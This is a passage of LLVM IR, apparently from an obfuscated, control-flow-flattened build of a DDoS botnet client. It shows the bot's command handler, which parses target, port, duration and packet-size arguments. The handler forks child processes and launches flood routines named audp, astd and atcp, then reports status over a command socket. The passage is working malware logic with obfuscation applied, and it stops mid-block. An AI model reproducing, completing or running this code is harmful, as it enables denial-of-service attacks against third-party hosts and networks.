  %.reg2mem8 = alloca i32
  %.reg2mem10 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1252006908, label %first
    i32 -613743809, label %44
    i32 -1342588023, label %48
    i32 -90970426, label %55
    i32 -1750390735, label %62
    i32 -618373625, label %69
    i32 -2134627520, label %76
    i32 -1067409201, label %83
    i32 -752587876, label %90
    i32 -739141217, label %94
    i32 200652868, label %101
    i32 -620093790, label %102
    i32 -680686882, label %125
    i32 -1887479502, label %130
    i32 346663566, label %131
    i32 -1484768253, label %136
    i32 -1845431373, label %139
    i32 8619037, label %143
    i32 2129964566, label %147
    i32 -627824778, label %156
    i32 -1313977969, label %158
    i32 -428519609, label %159
    i32 2118795609, label %163
    i32 -170494420, label %164
    i32 -160882839, label %173
    i32 -1656188965, label %174
    i32 588135330, label %181
    i32 -1852942070, label %185
    i32 -174738436, label %192
    i32 -1141735862, label %199
    i32 1452610504, label %200
    i32 1642852053, label %216
    i32 754340781, label %219
    i32 1791907265, label %223
    i32 -562364505, label %227
    i32 -1463006945, label %231
    i32 952622090, label %233
    i32 1669226846, label %234
    i32 509344888, label %238
    i32 -1637502414, label %239
    i32 -705187064, label %243
    i32 1971330329, label %244
    i32 -1166065943, label %251
    i32 -616264525, label %255
    i32 -808457879, label %262
    i32 345780460, label %269
    i32 -122512346, label %276
    i32 -122975005, label %283
    i32 1221612726, label %287
    i32 1159049430, label %294
    i32 486481111, label %298
    i32 1230475565, label %305
    i32 1826186981, label %306
    i32 885938220, label %328
    i32 276956702, label %333
    i32 712453301, label %334
    i32 -1299259276, label %338
    i32 1332899326, label %343
    i32 -588721646, label %344
    i32 1422105559, label %349
    i32 1319430448, label %352
    i32 -740956783, label %356
    i32 -1781405486, label %360
    i32 118304765, label %370
    i32 -1610954763, label %372
    i32 -234484835, label %373
    i32 1229852399, label %377
    i32 2126397415, label %378
    i32 -386921921, label %401
    i32 -880572806, label %402
    i32 -177903761, label %409
    i32 1012887376, label %413
    i32 -224142330, label %420
    i32 2006075350, label %427
    i32 -1555826802, label %434
    i32 -630039384, label %441
    i32 -1327554139, label %445
    i32 793947820, label %452
    i32 -848261541, label %456
    i32 -1018600154, label %463
    i32 1181627205, label %464
    i32 963459227, label %486
    i32 92528939, label %491
    i32 -1874721586, label %492
    i32 -1609270076, label %496
    i32 262158152, label %501
    i32 -3228387, label %502
    i32 -707496077, label %507
    i32 -922598759, label %510
    i32 -97878586, label %514
    i32 1678581135, label %518
    i32 -811268387, label %537
    i32 1734745441, label %539
    i32 137240174, label %540
    i32 1808280335, label %544
    i32 1707562557, label %545
    i32 1094237297, label %564
    i32 -1807059122, label %565
    i32 1958698110, label %572
    i32 -1286793859, label %576
    i32 960102171, label %583
    i32 -471076984, label %590
    i32 -1104226737, label %591
    i32 697328305, label %607
    i32 -398523161, label %610
    i32 -2014985924, label %614
    i32 1204511530, label %618
    i32 299415090, label %624
    i32 285870041, label %626
    i32 -462343200, label %627
    i32 -201755919, label %631
    i32 -2147243508, label %632
    i32 -472017700, label %636
    i32 -1593870825, label %637
    i32 -304824127, label %644
    i32 -1301716570, label %645
    i32 -37015241, label %650
    i32 1780488461, label %657
    i32 17763173, label %665
    i32 1844696734, label %673
    i32 130788617, label %674
    i32 -505190147, label %677
    i32 -1514283348, label %681
    i32 -267127399, label %682
    i32 1318146161, label %683
    i32 1513159941, label %684
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %42 = icmp ne i32 %.reload, 0
  %43 = select i1 %42, i32 -1656188965, i32 -613743809
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i32, i32* %3, align 4
  %46 = icmp slt i32 %45, 6
  %47 = select i1 %46, i32 200652868, i32 -1342588023
  store i32 %47, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i8**, i8*** %4, align 8
  %50 = getelementptr inbounds i8*, i8** %49, i64 3
  %51 = load i8*, i8** %50, align 8
  %52 = call i32 @atoi(i8* %51) #10
  %53 = icmp eq i32 %52, -1
  %54 = select i1 %53, i32 200652868, i32 -90970426
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i8**, i8*** %4, align 8
  %57 = getelementptr inbounds i8*, i8** %56, i64 2
  %58 = load i8*, i8** %57, align 8
  %59 = call i32 @atoi(i8* %58) #10
  %60 = icmp eq i32 %59, -1
  %61 = select i1 %60, i32 200652868, i32 -1750390735
  store i32 %61, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i8**, i8*** %4, align 8
  %64 = getelementptr inbounds i8*, i8** %63, i64 4
  %65 = load i8*, i8** %64, align 8
  %66 = call i32 @atoi(i8* %65) #10
  %67 = icmp eq i32 %66, -1
  %68 = select i1 %67, i32 200652868, i32 -618373625
  store i32 %68, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i8**, i8*** %4, align 8
  %71 = getelementptr inbounds i8*, i8** %70, i64 5
  %72 = load i8*, i8** %71, align 8
  %73 = call i32 @atoi(i8* %72) #10
  %74 = icmp eq i32 %73, -1
  %75 = select i1 %74, i32 200652868, i32 -2134627520
  store i32 %75, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %77 = load i8**, i8*** %4, align 8
  %78 = getelementptr inbounds i8*, i8** %77, i64 5
  %79 = load i8*, i8** %78, align 8
  %80 = call i32 @atoi(i8* %79) #10
  %81 = icmp sgt i32 %80, 65500
  %82 = select i1 %81, i32 200652868, i32 -1067409201
  store i32 %82, i32* %switchVar
  br label %loopEnd

; <label>:83:                                     ; preds = %loopEntry
  %84 = load i8**, i8*** %4, align 8
  %85 = getelementptr inbounds i8*, i8** %84, i64 4
  %86 = load i8*, i8** %85, align 8
  %87 = call i32 @atoi(i8* %86) #10
  %88 = icmp sgt i32 %87, 32
  %89 = select i1 %88, i32 200652868, i32 -752587876
  store i32 %89, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = load i32, i32* %3, align 4
  %92 = icmp eq i32 %91, 7
  %93 = select i1 %92, i32 -739141217, i32 -620093790
  store i32 %93, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i8**, i8*** %4, align 8
  %96 = getelementptr inbounds i8*, i8** %95, i64 6
  %97 = load i8*, i8** %96, align 8
  %98 = call i32 @atoi(i8* %97) #10
  %99 = icmp slt i32 %98, 1
  %100 = select i1 %99, i32 200652868, i32 -620093790
  store i32 %100, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  store i32 1513159941, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load i8**, i8*** %4, align 8
  %104 = getelementptr inbounds i8*, i8** %103, i64 1
  %105 = load i8*, i8** %104, align 8
  store i8* %105, i8** %5, align 8
  %106 = load i8**, i8*** %4, align 8
  %107 = getelementptr inbounds i8*, i8** %106, i64 2
  %108 = load i8*, i8** %107, align 8
  %109 = call i32 @atoi(i8* %108) #10
  store i32 %109, i32* %6, align 4
  %110 = load i8**, i8*** %4, align 8
  %111 = getelementptr inbounds i8*, i8** %110, i64 3
  %112 = load i8*, i8** %111, align 8
  %113 = call i32 @atoi(i8* %112) #10
  store i32 %113, i32* %7, align 4
  %114 = load i8**, i8*** %4, align 8
  %115 = getelementptr inbounds i8*, i8** %114, i64 4
  %116 = load i8*, i8** %115, align 8
  %117 = call i32 @atoi(i8* %116) #10
  store i32 %117, i32* %8, align 4
  %118 = load i8**, i8*** %4, align 8
  %119 = getelementptr inbounds i8*, i8** %118, i64 5
  %120 = load i8*, i8** %119, align 8
  %121 = call i32 @atoi(i8* %120) #10
  store i32 %121, i32* %9, align 4
  %122 = load i32, i32* %3, align 4
  %123 = icmp eq i32 %122, 7
  %124 = select i1 %123, i32 -680686882, i32 -1887479502
  store i32 %124, i32* %switchVar
  br label %loopEnd

; <label>:125:                                    ; preds = %loopEntry
  %126 = load i8**, i8*** %4, align 8
  %127 = getelementptr inbounds i8*, i8** %126, i64 6
  %128 = load i8*, i8** %127, align 8
  %129 = call i32 @atoi(i8* %128) #10
  store i32 346663566, i32* %switchVar
  store i32 %129, i32* %.reg2mem2
  br label %loopEnd

; <label>:130:                                    ; preds = %loopEntry
  store i32 346663566, i32* %switchVar
  store i32 10, i32* %.reg2mem2
  br label %loopEnd

; <label>:131:                                    ; preds = %loopEntry
  %.reload3 = load i32, i32* %.reg2mem2
  store i32 %.reload3, i32* %10, align 4
  %132 = load i8*, i8** %5, align 8
  %133 = call i8* @strstr(i8* %132, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #10
  %134 = icmp ne i8* %133, null
  %135 = select i1 %134, i32 -1484768253, i32 -428519609
  store i32 %135, i32* %switchVar
  br label %loopEnd

; <label>:136:                                    ; preds = %loopEntry
  %137 = load i8*, i8** %5, align 8
  %138 = call i8* @strtok(i8* %137, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %138, i8** %11, align 8
  store i32 -1845431373, i32* %switchVar
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %140 = load i8*, i8** %11, align 8
  %141 = icmp ne i8* %140, null
  %142 = select i1 %141, i32 8619037, i32 -1313977969
  store i32 %142, i32* %switchVar
  br label %loopEnd

; <label>:143:                                    ; preds = %loopEntry
  %144 = call i32 @listFork()
  %145 = icmp ne i32 %144, 0
  %146 = select i1 %145, i32 -627824778, i32 2129964566
  store i32 %146, i32* %switchVar
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  %148 = load i8*, i8** %11, align 8
  %149 = load i32, i32* %6, align 4
  %150 = load i32, i32* %7, align 4
  %151 = load i32, i32* %8, align 4
  %152 = load i32, i32* %9, align 4
  %153 = load i32, i32* %10, align 4
  call void @audp(i8* %148, i32 %149, i32 %150, i32 %151, i32 %152, i32 %153)
  %154 = load i32, i32* @mainCommSock, align 4
  %155 = call i32 @close(i32 %154)
  call void @_exit(i32 0) #11
  unreachable

; <label>:156:                                    ; preds = %loopEntry
  %157 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %157, i8** %11, align 8
  store i32 -1845431373, i32* %switchVar
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  store i32 -160882839, i32* %switchVar
  br label %loopEnd

; <label>:159:                                    ; preds = %loopEntry
  %160 = call i32 @listFork()
  %161 = icmp ne i32 %160, 0
  %162 = select i1 %161, i32 2118795609, i32 -170494420
  store i32 %162, i32* %switchVar
  br label %loopEnd

; <label>:163:                                    ; preds = %loopEntry
  store i32 1513159941, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i8*, i8** %5, align 8
  %166 = load i32, i32* %6, align 4
  %167 = load i32, i32* %7, align 4
  %168 = load i32, i32* %8, align 4
  %169 = load i32, i32* %9, align 4
  %170 = load i32, i32* %10, align 4
  call void @audp(i8* %165, i32 %166, i32 %167, i32 %168, i32 %169, i32 %170)
  %171 = load i32, i32* @mainCommSock, align 4
  %172 = call i32 @close(i32 %171)
  call void @_exit(i32 0) #11
  unreachable

; <label>:173:                                    ; preds = %loopEntry
  store i32 -1656188965, i32* %switchVar
  br label %loopEnd

; <label>:174:                                    ; preds = %loopEntry
  %175 = load i8**, i8*** %4, align 8
  %176 = getelementptr inbounds i8*, i8** %175, i64 0
  %177 = load i8*, i8** %176, align 8
  %178 = call i32 @strcmp(i8* %177, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.32, i32 0, i32 0)) #10
  %179 = icmp ne i32 %178, 0
  %180 = select i1 %179, i32 1971330329, i32 588135330
  store i32 %180, i32* %switchVar
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  %182 = load i32, i32* %3, align 4
  %183 = icmp slt i32 %182, 4
  %184 = select i1 %183, i32 -1141735862, i32 -1852942070
  store i32 %184, i32* %switchVar
  br label %loopEnd

; <label>:185:                                    ; preds = %loopEntry
  %186 = load i8**, i8*** %4, align 8
  %187 = getelementptr inbounds i8*, i8** %186, i64 2
  %188 = load i8*, i8** %187, align 8
  %189 = call i32 @atoi(i8* %188) #10
  %190 = icmp slt i32 %189, 1
  %191 = select i1 %190, i32 -1141735862, i32 -174738436
  store i32 %191, i32* %switchVar
  br label %loopEnd

; <label>:192:                                    ; preds = %loopEntry
  %193 = load i8**, i8*** %4, align 8
  %194 = getelementptr inbounds i8*, i8** %193, i64 3
  %195 = load i8*, i8** %194, align 8
  %196 = call i32 @atoi(i8* %195) #10
  %197 = icmp slt i32 %196, 1
  %198 = select i1 %197, i32 -1141735862, i32 1452610504
  store i32 %198, i32* %switchVar
  br label %loopEnd

; <label>:199:                                    ; preds = %loopEntry
  store i32 1513159941, i32* %switchVar
  br label %loopEnd

; <label>:200:                                    ; preds = %loopEntry
  %201 = load i8**, i8*** %4, align 8
  %202 = getelementptr inbounds i8*, i8** %201, i64 1
  %203 = load i8*, i8** %202, align 8
  store i8* %203, i8** %12, align 8
  %204 = load i8**, i8*** %4, align 8
  %205 = getelementptr inbounds i8*, i8** %204, i64 2
  %206 = load i8*, i8** %205, align 8
  %207 = call i32 @atoi(i8* %206) #10
  store i32 %207, i32* %13, align 4
  %208 = load i8**, i8*** %4, align 8
  %209 = getelementptr inbounds i8*, i8** %208, i64 3
  %210 = load i8*, i8** %209, align 8
  %211 = call i32 @atoi(i8* %210) #10
  store i32 %211, i32* %14, align 4
  %212 = load i8*, i8** %12, align 8
  %213 = call i8* @strstr(i8* %212, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #10
  %214 = icmp ne i8* %213, null
  %215 = select i1 %214, i32 1642852053, i32 1669226846
  store i32 %215, i32* %switchVar
  br label %loopEnd

; <label>:216:                                    ; preds = %loopEntry
  %217 = load i8*, i8** %12, align 8
  %218 = call i8* @strtok(i8* %217, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %218, i8** %15, align 8
  store i32 754340781, i32* %switchVar
  br label %loopEnd

; <label>:219:                                    ; preds = %loopEntry
  %220 = load i8*, i8** %15, align 8
  %221 = icmp ne i8* %220, null
  %222 = select i1 %221, i32 1791907265, i32 952622090
  store i32 %222, i32* %switchVar
  br label %loopEnd

; <label>:223:                                    ; preds = %loopEntry
  %224 = call i32 @listFork()
  %225 = icmp ne i32 %224, 0
  %226 = select i1 %225, i32 -1463006945, i32 -562364505
  store i32 %226, i32* %switchVar
  br label %loopEnd

; <label>:227:                                    ; preds = %loopEntry
  %228 = load i8*, i8** %15, align 8
  %229 = load i32, i32* %13, align 4
  %230 = load i32, i32* %14, align 4
  call void @astd(i8* %228, i32 %229, i32 %230)
  call void @_exit(i32 0) #11
  unreachable

; <label>:231:                                    ; preds = %loopEntry
  %232 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %232, i8** %15, align 8
  store i32 754340781, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  store i32 -705187064, i32* %switchVar
  br label %loopEnd

; <label>:234:                                    ; preds = %loopEntry
  %235 = call i32 @listFork()
  %236 = icmp ne i32 %235, 0
  %237 = select i1 %236, i32 509344888, i32 -1637502414
  store i32 %237, i32* %switchVar
  br label %loopEnd

; <label>:238:                                    ; preds = %loopEntry
  store i32 1513159941, i32* %switchVar
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  %240 = load i8*, i8** %12, align 8
  %241 = load i32, i32* %13, align 4
  %242 = load i32, i32* %14, align 4
  call void @astd(i8* %240, i32 %241, i32 %242)
  call void @_exit(i32 0) #11
  unreachable

; <label>:243:                                    ; preds = %loopEntry
  store i32 1971330329, i32* %switchVar
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %245 = load i8**, i8*** %4, align 8
  %246 = getelementptr inbounds i8*, i8** %245, i64 0
  %247 = load i8*, i8** %246, align 8
  %248 = call i32 @strcmp(i8* %247, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.33, i32 0, i32 0)) #10
  %249 = icmp ne i32 %248, 0
  %250 = select i1 %249, i32 -880572806, i32 -1166065943
  store i32 %250, i32* %switchVar
  br label %loopEnd

; <label>:251:                                    ; preds = %loopEntry
  %252 = load i32, i32* %3, align 4
  %253 = icmp slt i32 %252, 6
  %254 = select i1 %253, i32 1230475565, i32 -616264525
  store i32 %254, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  %256 = load i8**, i8*** %4, align 8
  %257 = getelementptr inbounds i8*, i8** %256, i64 3
  %258 = load i8*, i8** %257, align 8
  %259 = call i32 @atoi(i8* %258) #10
  %260 = icmp eq i32 %259, -1
  %261 = select i1 %260, i32 1230475565, i32 -808457879
  store i32 %261, i32* %switchVar
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  %263 = load i8**, i8*** %4, align 8
  %264 = getelementptr inbounds i8*, i8** %263, i64 2
  %265 = load i8*, i8** %264, align 8
  %266 = call i32 @atoi(i8* %265) #10
  %267 = icmp eq i32 %266, -1
  %268 = select i1 %267, i32 1230475565, i32 345780460
  store i32 %268, i32* %switchVar
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %270 = load i8**, i8*** %4, align 8
  %271 = getelementptr inbounds i8*, i8** %270, i64 4
  %272 = load i8*, i8** %271, align 8
  %273 = call i32 @atoi(i8* %272) #10
  %274 = icmp eq i32 %273, -1
  %275 = select i1 %274, i32 1230475565, i32 -122512346
  store i32 %275, i32* %switchVar
  br label %loopEnd

; <label>:276:                                    ; preds = %loopEntry
  %277 = load i8**, i8*** %4, align 8
  %278 = getelementptr inbounds i8*, i8** %277, i64 4
  %279 = load i8*, i8** %278, align 8
  %280 = call i32 @atoi(i8* %279) #10
  %281 = icmp sgt i32 %280, 32
  %282 = select i1 %281, i32 1230475565, i32 -122975005
  store i32 %282, i32* %switchVar
  br label %loopEnd

; <label>:283:                                    ; preds = %loopEntry
  %284 = load i32, i32* %3, align 4
  %285 = icmp sgt i32 %284, 6
  %286 = select i1 %285, i32 1221612726, i32 1159049430
  store i32 %286, i32* %switchVar
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  %288 = load i8**, i8*** %4, align 8
  %289 = getelementptr inbounds i8*, i8** %288, i64 6
  %290 = load i8*, i8** %289, align 8
  %291 = call i32 @atoi(i8* %290) #10
  %292 = icmp slt i32 %291, 0
  %293 = select i1 %292, i32 1230475565, i32 1159049430
  store i32 %293, i32* %switchVar
  br label %loopEnd

; <label>:294:                                    ; preds = %loopEntry
  %295 = load i32, i32* %3, align 4
  %296 = icmp eq i32 %295, 8
  %297 = select i1 %296, i32 486481111, i32 1826186981
  store i32 %297, i32* %switchVar
  br label %loopEnd

; <label>:298:                                    ; preds = %loopEntry
  %299 = load i8**, i8*** %4, align 8
  %300 = getelementptr inbounds i8*, i8** %299, i64 7
  %301 = load i8*, i8** %300, align 8
  %302 = call i32 @atoi(i8* %301) #10
  %303 = icmp slt i32 %302, 1
  %304 = select i1 %303, i32 1230475565, i32 1826186981
  store i32 %304, i32* %switchVar
  br label %loopEnd

; <label>:305:                                    ; preds = %loopEntry
  store i32 1513159941, i32* %switchVar
  br label %loopEnd

; <label>:306:                                    ; preds = %loopEntry
  %307 = load i8**, i8*** %4, align 8
  %308 = getelementptr inbounds i8*, i8** %307, i64 1
  %309 = load i8*, i8** %308, align 8
  store i8* %309, i8** %16, align 8
  %310 = load i8**, i8*** %4, align 8
  %311 = getelementptr inbounds i8*, i8** %310, i64 2
  %312 = load i8*, i8** %311, align 8
  %313 = call i32 @atoi(i8* %312) #10
  store i32 %313, i32* %17, align 4
  %314 = load i8**, i8*** %4, align 8
  %315 = getelementptr inbounds i8*, i8** %314, i64 3
  %316 = load i8*, i8** %315, align 8
  %317 = call i32 @atoi(i8* %316) #10
  store i32 %317, i32* %18, align 4
  %318 = load i8**, i8*** %4, align 8
  %319 = getelementptr inbounds i8*, i8** %318, i64 4
  %320 = load i8*, i8** %319, align 8
  %321 = call i32 @atoi(i8* %320) #10
  store i32 %321, i32* %19, align 4
  %322 = load i8**, i8*** %4, align 8
  %323 = getelementptr inbounds i8*, i8** %322, i64 5
  %324 = load i8*, i8** %323, align 8
  store i8* %324, i8** %20, align 8
  %325 = load i32, i32* %3, align 4
  %326 = icmp eq i32 %325, 8
  %327 = select i1 %326, i32 885938220, i32 276956702
  store i32 %327, i32* %switchVar
  br label %loopEnd

; <label>:328:                                    ; preds = %loopEntry
  %329 = load i8**, i8*** %4, align 8
  %330 = getelementptr inbounds i8*, i8** %329, i64 7
  %331 = load i8*, i8** %330, align 8
  %332 = call i32 @atoi(i8* %331) #10
  store i32 712453301, i32* %switchVar
  store i32 %332, i32* %.reg2mem4
  br label %loopEnd

; <label>:333:                                    ; preds = %loopEntry
  store i32 712453301, i32* %switchVar
  store i32 10, i32* %.reg2mem4
  br label %loopEnd

; <label>:334:                                    ; preds = %loopEntry
  %.reload5 = load i32, i32* %.reg2mem4
  store i32 %.reload5, i32* %21, align 4
  %335 = load i32, i32* %3, align 4
  %336 = icmp sgt i32 %335, 6
  %337 = select i1 %336, i32 -1299259276, i32 1332899326
  store i32 %337, i32* %switchVar
  br label %loopEnd

; <label>:338:                                    ; preds = %loopEntry
  %339 = load i8**, i8*** %4, align 8
  %340 = getelementptr inbounds i8*, i8** %339, i64 6
  %341 = load i8*, i8** %340, align 8
  %342 = call i32 @atoi(i8* %341) #10
  store i32 -588721646, i32* %switchVar
  store i32 %342, i32* %.reg2mem6
  br label %loopEnd

; <label>:343:                                    ; preds = %loopEntry
  store i32 -588721646, i32* %switchVar
  store i32 0, i32* %.reg2mem6
  br label %loopEnd

; <label>:344:                                    ; preds = %loopEntry
  %.reload7 = load i32, i32* %.reg2mem6
  store i32 %.reload7, i32* %22, align 4
  %345 = load i8*, i8** %16, align 8
  %346 = call i8* @strstr(i8* %345, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #10
  %347 = icmp ne i8* %346, null
  %348 = select i1 %347, i32 1422105559, i32 -234484835
  store i32 %348, i32* %switchVar
  br label %loopEnd

; <label>:349:                                    ; preds = %loopEntry
  %350 = load i8*, i8** %16, align 8
  %351 = call i8* @strtok(i8* %350, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %351, i8** %23, align 8
  store i32 1319430448, i32* %switchVar
  br label %loopEnd

; <label>:352:                                    ; preds = %loopEntry
  %353 = load i8*, i8** %23, align 8
  %354 = icmp ne i8* %353, null
  %355 = select i1 %354, i32 -740956783, i32 -1610954763
  store i32 %355, i32* %switchVar
  br label %loopEnd

; <label>:356:                                    ; preds = %loopEntry
  %357 = call i32 @listFork()
  %358 = icmp ne i32 %357, 0
  %359 = select i1 %358, i32 118304765, i32 -1781405486
  store i32 %359, i32* %switchVar
  br label %loopEnd

; <label>:360:                                    ; preds = %loopEntry
  %361 = load i8*, i8** %23, align 8
  %362 = load i32, i32* %17, align 4
  %363 = load i32, i32* %18, align 4
  %364 = load i32, i32* %19, align 4
  %365 = load i8*, i8** %20, align 8
  %366 = load i32, i32* %22, align 4
  %367 = load i32, i32* %21, align 4
  call void @atcp(i8* %361, i32 %362, i32 %363, i32 %364, i8* %365, i32 %366, i32 %367)
  %368 = load i32, i32* @mainCommSock, align 4
  %369 = call i32 @close(i32 %368)
  call void @_exit(i32 0) #11
  unreachable

; <label>:370:                                    ; preds = %loopEntry
  %371 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %371, i8** %23, align 8
  store i32 1319430448, i32* %switchVar
  br label %loopEnd

; <label>:372:                                    ; preds = %loopEntry
  store i32 -386921921, i32* %switchVar
  br label %loopEnd

; <label>:373:                                    ; preds = %loopEntry
  %374 = call i32 @listFork()
  %375 = icmp ne i32 %374, 0
  %376 = select i1 %375, i32 1229852399, i32 2126397415
  store i32 %376, i32* %switchVar
  br label %loopEnd

; <label>:377:                                    ; preds = %loopEntry
  store i32 1513159941, i32* %switchVar
  br label %loopEnd

; <label>:378:                                    ; preds = %loopEntry
  %379 = load i32, i32* @mainCommSock, align 4
  %380 = load i8**, i8*** %4, align 8
  %381 = getelementptr inbounds i8*, i8** %380, i64 1
  %382 = load i8*, i8** %381, align 8
  %383 = load i8**, i8*** %4, align 8
  %384 = getelementptr inbounds i8*, i8** %383, i64 2
  %385 = load i8*, i8** %384, align 8
  %386 = call i32 @atoi(i8* %385) #10
  %387 = load i8**, i8*** %4, align 8
  %388 = getelementptr inbounds i8*, i8** %387, i64 3
  %389 = load i8*, i8** %388, align 8
  %390 = call i32 @atoi(i8* %389) #10
  %391 = call i32 (i32, i8*, ...) @sockprintf(i32 %379, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.34, i32 0, i32 0), i8* %382, i32 %386, i32 %390)
  %392 = load i8*, i8** %16, align 8
  %393 = load i32, i32* %17, align 4
  %394 = load i32, i32* %18, align 4
  %395 = load i32, i32* %19, align 4
  %396 = load i8*, i8** %20, align 8
  %397 = load i32, i32* %22, align 4
  %398 = load i32, i32* %21, align 4
  call void @atcp(i8* %392, i32 %393, i32 %394, i32 %395, i8* %396, i32 %397, i32 %398)
  %399 = load i32, i32* @mainCommSock, align 4
  %400 = call i32 @close(i32 %399)
  call void @_exit(i32 0) #11
  unreachable

; <label>:401:                                    ; preds = %loopEntry
  store i32 -880572806, i32* %switchVar
  br label %loopEnd

; <label>:402:                                    ; preds = %loopEntry
  %403 = load i8**, i8*** %4, align 8
  %404 = getelementptr inbounds i8*, i8** %403, i64 0
  %405 = load i8*, i8** %404, align 8
  %406 = call i32 @strcmp(i8* %405, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i32 0, i32 0)) #10
  %407 = icmp ne i32 %406, 0
  %408 = select i1 %407, i32 -1807059122, i32 -177903761
  store i32 %408, i32* %switchVar
  br label %loopEnd

; <label>:409:                                    ; preds = %loopEntry
  %410 = load i32, i32* %3, align 4
  %411 = icmp slt i32 %410, 6
  %412 = select i1 %411, i32 -1018600154, i32 1012887376
  store i32 %412, i32* %switchVar
  br label %loopEnd

; <label>:413:                                    ; preds = %loopEntry
  %414 = load i8**, i8*** %4, align 8
  %415 = getelementptr inbounds i8*, i8** %414, i64 3
  %416 = load i8*, i8** %415, align 8
  %417 = call i32 @atoi(i8* %416) #10
  %418 = icmp eq i32 %417, -1
  %419 = select i1 %418, i32 -1018600154, i32 -224142330
  store i32 %419, i32* %switchVar
  br label %loopEnd

; <label>:420:                                    ; preds = %loopEntry
  %421 = load i8**, i8*** %4, align 8
  %422 = getelementptr inbounds i8*, i8** %421, i64 2
  %423 = load i8*, i8** %422, align 8
  %424 = call i32 @atoi(i8* %423) #10
  %425 = icmp eq i32 %424, -1
  %426 = select i1 %425, i32 -1018600154, i32 2006075350
  store i32 %426, i32* %switchVar
  br label %loopEnd

; <label>:427:                                    ; preds = %loopEntry
  %428 = load i8**, i8*** %4, align 8
  %429 = getelementptr inbounds i8*, i8** %428, i64 4
  %430 = load i8*, i8** %429, align 8
  %431 = call i32 @atoi(i8* %430) #10
  %432 = icmp eq i32 %431, -1
  %433 = select i1 %432, i32 -1018600154, i32 -1555826802
  store i32 %433, i32* %switchVar
  br label %loopEnd

; <label>:434:                                    ; preds = %loopEntry
  %435 = load i8**, i8*** %4, align 8
  %436 = getelementptr inbounds i8*, i8** %435, i64 4
  %437 = load i8*, i8** %436, align 8
  %438 = call i32 @atoi(i8* %437) #10
  %439 = icmp sgt i32 %438, 32
  %440 = select i1 %439, i32 -1018600154, i32 -630039384
  store i32 %440, i32* %switchVar
  br label %loopEnd

; <label>:441:                                    ; preds = %loopEntry
  %442 = load i32, i32* %3, align 4
  %443 = icmp sgt i32 %442, 6
  %444 = select i1 %443, i32 -1327554139, i32 793947820
  store i32 %444, i32* %switchVar
  br label %loopEnd

; <label>:445:                                    ; preds = %loopEntry
  %446 = load i8**, i8*** %4, align 8
  %447 = getelementptr inbounds i8*, i8** %446, i64 6
  %448 = load i8*, i8** %447, align 8
  %449 = call i32 @atoi(i8* %448) #10
  %450 = icmp slt i32 %449, 0
  %451 = select i1 %450, i32 -1018600154, i32 793947820
  store i32 %451, i32* %switchVar
  br label %loopEnd

; <label>:452:                                    ; preds = %loopEntry
  %453 = load i32, i32* %3, align 4
  %454 = icmp eq i32 %453, 8
  %455 = select i1 %454, i32 -848261541, i32 1181627205
  store i32 %455, i32* %switchVar
  br label %loopEnd

; <label>:456:                                    ; preds = %loopEntry
  %457 = load i8**, i8*** %4, align 8
  %458 = getelementptr inbounds i8*, i8** %457, i64 7
  %459 = load i8*, i8** %458, align 8
  %460 = call i32 @atoi(i8* %459) #10
  %461 = icmp slt i32 %460, 1
  %462 = select i1 %461, i32 -1018600154, i32 1181627205
  store i32 %462, i32* %switchVar
  br label %loopEnd

; <label>:463:                                    ; preds = %loopEntry
  store i32 1513159941, i32* %switchVar
  br label %loopEnd

; <label>:464:                                    ; preds = %loopEntry
  %465 = load i8**, i8*** %4, align 8
